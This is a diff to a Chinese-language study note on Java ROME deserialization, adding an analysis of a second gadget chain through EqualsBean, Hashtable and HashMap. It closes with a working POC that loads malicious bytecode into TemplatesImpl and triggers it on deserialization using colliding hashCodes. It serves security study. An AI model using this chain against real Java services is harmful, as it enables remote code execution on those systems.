@@ -4,7 +4,7 @@
 
 
 
-# 分析
+# 链子1分析
 
 从网上找了利用链：
 
@@ -220,6 +220,171 @@ public class SerializeUtil {
 同样的，为了防止`put`的时候触发反序列化，先放进去无害的，`put`完之后再利用反射来修改`_equalsBean`为恶意的。
 
 ![image-20211109203550428]([Java反序列化]rome反序列化学习.assets/image-20211109203550428.png)
+
+
+
+# 链子2分析
+
+链子2来自Jiang师傅，最后利用点是在`EqualsBean`中：
+
+```java
+    public boolean beanEquals(Object obj) {
+        Object bean1 = _obj;
+        Object bean2 = obj;
+        boolean eq;
+        if (bean2==null) {
+            eq = false;
+        }
+        else
+        if (bean1==null && bean2==null) {
+            eq = true;
+        }
+        else
+            if (bean1==null || bean2==null) {
+                eq = false;
+            }
+            else {
+                if (!_beanClass.isInstance(bean2)) {
+                    eq = false;
+                }
+                else {
+                    eq = true;
+                    try {
+                        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);
+                        if (pds!=null) {
+                            for (int i = 0; eq && i<pds.length; i++) {
+                                Method pReadMethod = pds[i].getReadMethod();
+                                if (pReadMethod!=null && // ensure it has a getter method
+                                        pReadMethod.getDeclaringClass()!=Object.class && // filter Object.class getter methods
+                                        pReadMethod.getParameterTypes().length==0) {     // filter getter methods that take parameters
+                                    Object value1 = pReadMethod.invoke(bean1, NO_PARAMS);
+                                    Object value2 = pReadMethod.invoke(bean2, NO_PARAMS);
+                                    eq = doEquals(value1, value2);
+                                }
+                            }
+                        }
+                    }
+                    catch (Exception ex) {
+                        throw new RuntimeException("Could not execute equals()", ex);
+                    }
+                }
+            }
+        return eq;
+    }
+```
+
+和`ToStringBean`最后那里有类似的作用。
+
+需要`_obj`和`obj`类相同（可以这样认为，具体看代码的那个instance of）。`equals`方法正好调用了：
+
+```java
+    public boolean equals(Object obj) {
+        return beanEquals(obj);
+    }
+```
+
+和CC7的前半部分思路一样，CC7之后再去看了。
+
+主要是Hashtable反序列化的时候调用了`reconstitutionPut`：
+
+```java
+    private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
+        throws StreamCorruptedException
+    {
+        if (value == null) {
+            throw new java.io.StreamCorruptedException();
+        }
+        // Makes sure the key is not already in the hashtable.
+        // This should not happen in deserialized version.
+        int hash = key.hashCode();
+        int index = (hash & 0x7FFFFFFF) % tab.length;
+        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
+            if ((e.hash == hash) && e.key.equals(key)) {
+                throw new java.io.StreamCorruptedException();
+            }
+        }
+        // Creates the new entry.
+        @SuppressWarnings("unchecked")
+            Entry<K,V> e = (Entry<K,V>)tab[index];
+        tab[index] = new Entry<>(hash, key, value, e);
+        count++;
+    }
+```
+
+需要hash相同才能进入`e.key.equals`。让`e.key`是`HashMap`：
+
+```java
+    public boolean equals(Object o) {
+        if (o == this)
+            return true;
+
+        if (!(o instanceof Map))
+            return false;
+        Map<?,?> m = (Map<?,?>) o;
+        if (m.size() != size())
+            return false;
+
+        try {
+            Iterator<Entry<K,V>> i = entrySet().iterator();
+            while (i.hasNext()) {
+                Entry<K,V> e = i.next();
+                K key = e.getKey();
+                V value = e.getValue();
+                if (value == null) {
+                    if (!(m.get(key)==null && m.containsKey(key)))
+                        return false;
+                } else {
+                    if (!value.equals(m.get(key)))
+                        return false;
+                }
+            }
+        } catch (ClassCastException unused) {
+            return false;
+        } catch (NullPointerException unused) {
+            return false;
+        }
+
+        return true;
+    }
+```
+
+最后`if (!value.equals(m.get(key)))`触发。
+
+对于hashCode的相同，用的是Java的trick：
+
+```java
+        System.out.println("yy".hashCode());//3872
+        System.out.println("zZ".hashCode());//3872
+```
+
+学习了学习了。
+
+
+
+直接给POC了，Jiang宝nb：
+
+```java
+        byte[] evilCode = SerializeUtil.getEvilCode();
+        TemplatesImpl templates = new TemplatesImpl();
+        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{evilCode});
+        SerializeUtil.setFieldValue(templates,"_name","f");
+        //SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
+        EqualsBean bean = new EqualsBean(String.class,"feng");
+
+        HashMap map1 = new HashMap();
+        HashMap map2 = new HashMap();
+        map1.put("yy",bean);
+        map1.put("zZ",templates);
+        map2.put("zZ",bean);
+        map2.put("yy",templates);
+        Hashtable table = new Hashtable();
+        table.put(map1,"1");
+        table.put(map2,"2");
+        SerializeUtil.setFieldValue(bean,"_beanClass",Templates.class);
+        SerializeUtil.setFieldValue(bean,"_obj",templates);
+        byte[] data = SerializeUtil.serialize(table);
+        SerializeUtil.unserialize(data);
+```
 
 
 
